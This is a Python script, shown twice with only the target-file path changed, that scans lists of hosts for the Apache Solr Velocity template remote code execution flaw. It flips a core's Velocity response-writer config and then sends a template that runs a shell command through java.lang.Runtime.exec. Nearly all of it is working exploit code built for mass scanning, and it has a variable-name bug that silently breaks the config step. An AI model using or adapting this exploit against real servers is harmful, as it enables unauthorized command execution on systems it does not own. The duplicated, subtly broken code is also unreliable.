#coding=utf-8

import requests

import sys

import json

def Get_Name(url):
	try :
		test_url=url+"/solr/admin/cores?wt=json&indexInfo=false"
		Connect=list(json.loads(requests.get(test_url).text)["status"])[0]
		name=Connect
	except Exception:
		return "admin"
	return name
	pass

def Update_Config(url,name) :
	url_test=url+"/solr/"+name+"/config"
	headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"}
	Post_Data='''
	    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
	'''
	try :
		test_con=requests.post(url_test,data=post_data, headers=headers)
		if test_con.status_code !=200 :
			return 0
	except Exception :
		return 0

	pass


def Data_Save():
	pass


def Start(url):
	test_name=Get_Name(url)
	Update_Config(url,test_name)
	try :
		Exp_Url=url+"/solr/"+test_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo%20Mikasa%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
		emmmm=requests.get(Exp_Url)
	except Exception:
		return
	if "Mikasa" in emmmm.text :
		print(url+"  Is exist Vuln")
	pass

def Get_List():
	return list(open("/Users/mikasa/Desktop/工具集合/信息收集/fofa查询_GUI/Mikasa.txt","r"))
	pass

if __name__=='__main__':
	ip_test=Get_List()
	for test in ip_test:
		if "http" not in test:
			test="http://"+test
			test=test.strip()
			Start(test)
	pass
#coding=utf-8

import requests

import sys

import json

def Get_Name(url):
	try :
		test_url=url+"/solr/admin/cores?wt=json&indexInfo=false"
		Connect=list(json.loads(requests.get(test_url).text)["status"])[0]
		name=Connect
	except Exception:
		return "admin"
	return name
	pass

def Update_Config(url,name) :
	url_test=url+"/solr/"+name+"/config"
	headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"}
	Post_Data='''
	    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
	'''
	try :
		test_con=requests.post(url_test,data=post_data, headers=headers)
		if test_con.status_code !=200 :
			return 0
	except Exception :
		return 0

	pass


def Data_Save():
	pass


def Start(url):
	test_name=Get_Name(url)
	Update_Config(url,test_name)
	try :
		Exp_Url=url+"/solr/"+test_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo%20Mikasa%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
		emmmm=requests.get(Exp_Url)
	except Exception:
		return
	if "Mikasa" in emmmm.text :
		print(url+"  Is exist Vuln")
	pass

def Get_List():
	return list(open("target.txt","r"))
	pass

if __name__=='__main__':
	ip_test=Get_List()
	for test in ip_test:
		if "http" not in test:
			test="http://"+test
			test=test.strip()
			Start(test)
	pass
